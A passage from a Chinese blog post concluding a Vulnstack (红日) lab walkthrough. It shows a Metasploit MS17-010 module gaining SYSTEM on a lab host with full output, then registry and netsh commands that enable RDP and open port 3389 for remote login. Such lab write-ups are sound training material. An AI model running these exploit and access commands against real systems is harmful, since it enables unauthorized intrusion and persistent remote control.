+<p>然后使用模块<code>admin/smb/ms17_010_command</code>直接打，发现可以成功，前提是需要设置路由转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; <span class="built_in">set</span> RHOSTS 192.168.52.138</span><br><span class="line">RHOSTS =&gt; 192.168.52.138</span><br><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; <span class="built_in">set</span> <span class="built_in">command</span> <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">command</span> =&gt; <span class="built_in">whoami</span></span><br><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.52.138:445    - Target OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[*] 192.168.52.138:445    - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.52.138:445    - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[+] 192.168.52.138:445    - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] 192.168.52.138:445    - Getting the <span class="built_in">command</span> output...</span><br><span class="line">[*] 192.168.52.138:445    - Executing cleanup...</span><br><span class="line">[+] 192.168.52.138:445    - Cleanup was successful</span><br><span class="line">[+] 192.168.52.138:445    - Command completed successfully!</span><br><span class="line">[*] 192.168.52.138:445    - Output <span class="keyword">for</span> <span class="string">&quot;whoami&quot;</span>:</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] 192.168.52.138:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后就是开启rdp服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261522261.png" title="image-20230226152243197" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261522261.png" alt="image-20230226152243197"></a></p>
+<p>并开放防火墙3389端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> netsh advfirewall firewall add rule name=\&quot;Remote Desktop\&quot; protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=3389 action=allow</span><br></pre></td></tr></table></figure>
+
+<p>然后使用rdp登录，这样要记得登录的是god域</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261530235.png" title="image-20230226153022151" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261530235.png" alt="image-20230226153022151"></a></p>
+<p>拿下！</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶场的流程，就是</p>
+<ul>
+<li>外网渗透拿到主机shell</li>
+<li>扫描内网存活主机，并查看是否存在历史漏洞</li>
+<li>使用内网代理和路由转发来对内网主机进行攻击</li>
+</ul>
+<p>应该还有很多思路，这个是比较简单的靶场，继续加油</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/A3MIuT7RXTIIPNLjF42OTg">实战 ｜ 记一次基础的内网Vulnstack靶机渗透一</a></li>
+</ul>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/'>
+                            内网渗透
+                        </a>
+                    
+                        <a href='/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/'>
+                            代理转发
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/'>
+                            红日靶场
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
